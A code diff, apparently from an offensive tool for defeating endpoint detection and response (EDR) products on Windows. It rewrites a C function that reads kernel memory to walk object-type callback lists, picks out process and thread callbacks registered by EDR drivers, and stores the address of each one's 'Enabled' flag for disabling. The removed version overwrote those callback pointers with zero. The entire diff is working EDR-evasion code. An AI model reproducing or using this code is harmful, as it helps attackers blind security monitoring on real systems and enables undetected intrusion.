@@ -171,6 +171,20 @@ void EnumAllObjectsCallbacks() {
     }
 }
 
+#define STRING_MAX_LENGTH 256
+WORD ReadStringW(DWORD64 Address, wchar_t buffer[STRING_MAX_LENGTH]) {
+    wchar_t v = 0x0;
+    wchar_t i = 0;
+
+    do {
+        v = (wchar_t)ReadMemoryDWORD(Address + (i * sizeof(WORD)));
+        buffer[i++] = v;
+
+    } while (v);
+
+    return i;
+}
+
 BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
   if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
     _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
@@ -178,108 +192,136 @@ BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundOb
   }
   BOOL found = FALSE;
 
+// DebugBreak();
 
+  _putts_or_not(TEXT("[+] Enumerating object callbacks"));
   const DWORD64 objectDirectory = ReadKernelMemoryDWORD64(g_ntoskrnlOffsets.st.ObpTypeDirectoryObject);
-  _tprintf_or_not(TEXT("[+] objectDirectory      : %p", objectDirectory));
+  _tprintf_or_not(TEXT("[+] objectDirectory (array) : %p\n"), (PVOID)objectDirectory);
+  DWORD64 objectDirectoryEntryAddress;
 
-  DWORD64 objectDirectoryEntryAddress = ReadMemoryDWORD64(Device, objectDirectory);
-  _tprintf_or_not(TEXT("[+] objectDirectory start address (array) : %p", objectDirectoryEntryAddress));
-  DWORD64 firstObjectDirectoryEntry = objectDirectoryEntryAddress;
-
-  Log("[+] Enumerating object callbacks");
   for (int i = 0; i < OBJECT_HASH_TABLE_SIZE; i++) {
-    objectDirectoryEntryAddress =  firstObjectDirectoryEntry + (i* 0x8);
-    _tprintf_or_not(TEXT("                                           "));
-    _tprintf_or_not(TEXT("[+] Array lookup : %d : %p", i, objectDirectoryEntryAddress));
+    objectDirectoryEntryAddress =  objectDirectory + (i* 0x8);
+    _tprintf_or_not(TEXT("[%d]-------------------------------------------"), i);
+    Debug(TEXT("[+] Array lookup : %d : %p\n"), i, (PVOID)objectDirectoryEntryAddress);
 
 
     if (objectDirectoryEntryAddress) {
-      DWORD64 objectDirectoryEntry = ReadMemoryDWORD64(Device, objectDirectoryEntryAddress);
-      _tprintf_or_not(TEXT("[+] objectDirectoryEntry    (%p) : %p", objectDirectoryEntryAddress, objectDirectoryEntry));
+      DWORD64 objectDirectoryEntry = ReadMemoryDWORD64(objectDirectoryEntryAddress);
+      Debug(TEXT("[+] objectDirectoryEntry    (%p) : %p\n"), (PVOID)objectDirectoryEntryAddress, (PVOID)objectDirectoryEntry);
 
 
       while (objectDirectoryEntry) {
-        _tprintf_or_not(TEXT("[***] While Loop -----------------"));
+        Debug(TEXT("[***] While Loop -----------------"));
 
 
         DWORD64 objectTypeAddress = objectDirectoryEntry +0x8; //ObjectDirectoryEntry->ObjectType
-        DWORD64 objectType = ReadMemoryDWORD64(Device, objectTypeAddress);
-        _tprintf_or_not(TEXT("[+++] objectType              (%p): %p", objectTypeAddress, objectType));
+        DWORD64 ObjectType = ReadMemoryDWORD64(objectTypeAddress);
+        _tprintf_or_not(TEXT("[+++] objectType              (%p): %p\n"), (PVOID)objectTypeAddress, (PVOID)ObjectType);
 
 
-        DWORD64 objectTypeNameAddress = objectType + 0x18;
+        DWORD64 objectTypeNameAddress = ObjectType + 0x18;
         wchar_t objectName[STRING_MAX_LENGTH] = { 0 };
 
-        DWORD64 objNameAddress = ReadMemoryDWORD64(Device, objectTypeNameAddress);
-        WORD size = ReadStringW(Device, objNameAddress, objectName);
-        _tprintf_or_not(TEXT("[+++] objectName[%d]          (%p): %ls",size, objNameAddress, objectName));
+        DWORD64 objNameAddress = ReadMemoryDWORD64(objectTypeNameAddress);
+        WORD size = ReadStringW(objNameAddress, objectName);
+        _tprintf_or_not(TEXT("[+++] objectName[%d]          (%p): %ls\n"),size, (PVOID)objNameAddress, objectName);
 
+        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;
+        // The CallbackList is a pointer to the real double-linked Callback list
+        // However itself acts as a double-linked entry, both Flink & Blink points to the first entry of the target,
+        // otherwise to the address of this field itself if empty
+        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
+            cbEntry != ObjectType_Callbacks_List;
+            cbEntry = ReadMemoryDWORD64(cbEntry)) {
+            if (FoundObjectCallbacks->index >= 256) {
+                _putts_or_not(TEXT("[!] No more space to store object callbacks !!! This should not happen. Exiting..."));
+                exit(1);
+            }
+            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
+            if (ObjectTypeField != ObjectType) {
+                _putts_or_not(TEXT("Unexpected value in callback entry (ObjectTypeField), exiting..."));
+                exit(1);
+            }
+            DWORD Operations = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Operations);
+            TCHAR* OperationsString;
+            switch (Operations) {
+            case 1: // OB_OPERATION_HANDLE_CREATE
+                OperationsString = TEXT("creations");
+                break;
+            case 2: // OB_OPERATION_HANDLE_DUPLICATE
+                OperationsString = TEXT("duplications");
+                break;
+            case 3: // OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE 
+                OperationsString = TEXT("creations & duplications");
+                break;
+            default:
+                _putts_or_not(TEXT("Unexpected value in callback entry (Operations), exiting..."));
+                exit(1);
+            }
+            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\tCallback at %p for handle %s:\n"), (PVOID)cbEntry, OperationsString);
+            BOOL Enabled = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled);
+            if (Enabled != FALSE && Enabled != TRUE) {
+                _putts_or_not(TEXT("Unexpected value in callback entry (Enabled), exiting..."));
+                exit(1);
+            }
+            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tStatus: %s\n"), Enabled ? TEXT("Enabled") : TEXT("Disabled"));
+            DWORD64 PreOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PreOperation);
+            if (PreOperation) {
+                DWORD64 driverOffset;
+                TCHAR* driverNamePreOperation = FindDriverName(PreOperation, &driverOffset);
+                _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tPreoperation at 0x%016llx [%s + 0x%llx]\n"), PreOperation, driverNamePreOperation, driverOffset);
+                if (isDriverNameMatchingEDR(driverNamePreOperation)) {
+                    _putts_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
+                    if (Enabled) {
+                        _putts_or_not(TEXT("and is enabled!"));
+                        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
+                        cb->type = OBJECT_CALLBACK;
+                        cb->driver_name = driverNamePreOperation;
+                        cb->removed = FALSE;
+                        cb->callback_func = PreOperation;
+                        cb->addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
+                        FoundObjectCallbacks->index++;
+                        found |= TRUE;
+                    }
+                    else {
+                        _putts_or_not(TEXT("but is disabled."));
 
-        if (  wcscmp(objectName, L"Process") == 0
-            || wcscmp(objectName, L"Thread")  == 0
-            || wcscmp(objectName, L"Desktop") == 0) {
-          Log("[[[[[[[[[[[[[[[[[[[[[[[[[");
-          // It is not a Process, Thread ot Desktop Callback
-          DWORD64 ObjectCallbackEntryAddress = objectType + 0xC8;
-          DWORD64  ObjectCallbackEntry = ReadMemoryDWORD64(Device, ObjectCallbackEntryAddress);
-          _tprintf_or_not(TEXT("[+++]  ObjectCallbackEntry    (%p): %p", ObjectCallbackEntryAddress, ObjectCallbackEntry));
-
-          if (ObjectCallbackEntry) {
-            do {
-              _tprintf_or_not(TEXT("[******] Do Loop -----------------"));
-
-
-              ULONG ObjectCallbackEntryActive =  ReadMemoryDWORD(Device, ObjectCallbackEntry + 0x14);
-              _tprintf_or_not(TEXT("[++++++]  ObjectCallbackEntryActive  : %d", ObjectCallbackEntryActive));
-
-
-              if (ObjectCallbackEntryActive && objectType) {
-
-                DWORD64 preOpAddress = ObjectCallbackEntry + 0x28;
-                DWORD64 preOp = ReadMemoryDWORD64(Device, preOpAddress);
-                _tprintf_or_not(TEXT("[+++++++++] preOp       (%p) : %p", preOpAddress, preOp));
-
-                if (preOp) {
-                  if (remove && (remove == preOp)) {
-                    WriteMemoryDWORD64(Device, preOpAddress, 0x0);
-                  }
-                  else {
-                    FindDriver(preOp);
-                  }
-
-
+                    }
                 }
-
-
-                DWORD64 postOpAddress = ObjectCallbackEntry + 0x30;
-                DWORD64 postOp = ReadMemoryDWORD64(Device, postOpAddress);
-                _tprintf_or_not(TEXT("[+++++++++] postOp       (%p) : %p", postOpAddress, postOp));
-
-                if (remove && (remove == postOp)) {
-                  WriteMemoryDWORD64(Device, postOpAddress, 0x0);
+            }
+            DWORD64 PostOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PostOperation);
+            if (PostOperation) {
+                DWORD64 driverOffset;
+                TCHAR* driverNamePostOperation = FindDriverName(PostOperation, &driverOffset);
+                _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tPostoperation at 0x%016llx [%s + 0x%llx]\n"), PostOperation, driverNamePostOperation, driverOffset);
+                if (Enabled && isDriverNameMatchingEDR(driverNamePostOperation)) {
+                    _putts_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
+                    if (Enabled) {
+                        _putts_or_not(TEXT("and is enabled!"));
+                        if (FoundObjectCallbacks->index != 0 &&
+                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index - 1].addresses.object_callback.enable_addr == cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled) {
+                            //skip if last callback function belong to the same callback entry (preoperation)
+                            continue;
+                        }
+                        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
+                        cb->type = OBJECT_CALLBACK;
+                        cb->driver_name = driverNamePostOperation;
+                        cb->removed = FALSE;
+                        cb->callback_func = PostOperation;
+                        cb->addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
+                        FoundObjectCallbacks->index++;
+                        found |= TRUE;
+                    }
+                    else {
+                        _putts_or_not(TEXT("but is disabled."));
+                    }
                 }
-                else {
-                  FindDriver(postOp);
-                }
+            }
+        }
 
-
-              }//end if
-
-              ObjectCallbackEntryAddress = ReadMemoryDWORD64(Device, ObjectCallbackEntry);
-              _tprintf_or_not(TEXT("[++++++] ObjectCallbackEntry->CallbackList.Flink  : %p ", ObjectCallbackEntryAddress));
-              _tprintf_or_not(TEXT("[++++++] ObjectCallbackEntry                      : %p ", ObjectCallbackEntry));
-              _tprintf_or_not(TEXT("[++++++] objectType + 0xC8                        : %p ", objectType + 0xC8));
-
-
-            } while (ObjectCallbackEntryAddress != (objectType + 0xC8));
-          }//end if
-          Log("]]]]]]]]]]]]]]]]]]]]]]]]]]]]");
-        }//end if {objectName}
-
-      objectDirectoryEntryAddress = objectDirectoryEntry;
-      objectDirectoryEntry = ReadMemoryDWORD64(Device, objectDirectoryEntryAddress); //ObjectDirectoryEntry->ChainLink 
-      _tprintf_or_not(TEXT("[+++] objectDirectoryEntry    (%p) : %p", objectDirectoryEntryAddress, objectDirectoryEntry));
-      _tprintf_or_not(TEXT("[***] Chianlink hit"));
+        objectDirectoryEntryAddress = objectDirectoryEntry;
+        objectDirectoryEntry = ReadMemoryDWORD64(objectDirectoryEntryAddress); //ObjectDirectoryEntry->ChainLink 
+        Debug(TEXT("[+++] next objectDirectoryEntry    (%p) : %p\n"), (PVOID)objectDirectoryEntryAddress, (PVOID)objectDirectoryEntry);
       }//end while
     }//end if
   }//end for
